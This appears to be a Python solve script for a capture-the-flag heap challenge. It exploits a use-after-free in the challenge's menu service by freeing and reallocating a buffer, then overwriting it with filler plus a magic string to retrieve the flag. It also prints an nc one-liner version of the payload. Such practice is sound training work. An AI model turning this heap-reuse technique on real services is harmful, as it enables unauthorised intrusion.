#!/usr/bin/env python3
"""
Remote exploit for heap_jumia challenge
Server: ctf.1337.ma:1338
"""

import socket

def exploit_remote():
    host = 'ctf.1337.ma'
    port = 1338
    
    print(f"[*] Connecting to {host}:{port}...")
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    try:
        s.connect((host, port))
    except (socket.gaierror, socket.timeout, ConnectionRefusedError) as e:
        print(f"[!] Connection failed: {e}")
        print("[*] Server may be offline or challenge ended")
        print("\n[*] Exploit payload for manual use:")
        print("="*60)
        print("echo -ne '2\\n1\\n38\\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAw3th4nds\\n3\\n' | nc ctf.1337.ma 1338")
        print("="*60)
        return None
    
    # Receive banner
    banner = s.recv(4096)
    print(banner.decode(errors='ignore'))
    
    # Exploit sequence:
    # 2: obliterate (free allocated_space)
    print("[*] Sending: 2 (Obliterate)")
    s.send(b'2\n')
    response = s.recv(4096)
    print(response.decode(errors='ignore'))
    
    # 1: reserve_space
    print("[*] Sending: 1 (Reserve space)")
    s.send(b'1\n')
    response = s.recv(4096)
    print(response.decode(errors='ignore'))
    
    # Size: 38 (0x26)
    print("[*] Sending size: 38")
    s.send(b'38\n')
    response = s.recv(4096)
    print(response.decode(errors='ignore'))
    
    # Payload: 30 bytes filler + "w3th4nds"
    payload = b'A' * 30 + b'w3th4nds\n'
    print(f"[*] Sending payload: {payload}")
    s.send(payload)
    response = s.recv(4096)
    print(response.decode(errors='ignore'))
    
    # 3: road_to_salvation (trigger check)
    print("[*] Sending: 3 (Road to salvation)")
    s.send(b'3\n')
    
    # Receive flag
    import time
    time.sleep(1)
    flag_response = s.recv(8192)
    print("\n" + "="*60)
    print("RESPONSE:")
    print("="*60)
    print(flag_response.decode(errors='ignore'))
    
    s.close()
    
    # Extract flag
    import re
    match = re.search(r'DeepSec\{[^}]+\}', flag_response.decode(errors='ignore'))
    if match:
        flag = match.group(0)
        print("\n" + "="*60)
        print(f"[+] FLAG FOUND: {flag}")
        print("="*60)
        
        # Save flag
        with open('/workspaces/ctf/heap_dyl_jumia/FLAG.txt', 'w') as f:
            f.write(flag + '\n')
        print(f"[+] Flag saved to FLAG.txt")
        
        return flag
    else:
        print("[-] No flag found in response")
        return None

if __name__ == '__main__':
    try:
        exploit_remote()
    except Exception as e:
        print(f"[!] Error: {e}")
        import traceback
        traceback.print_exc()
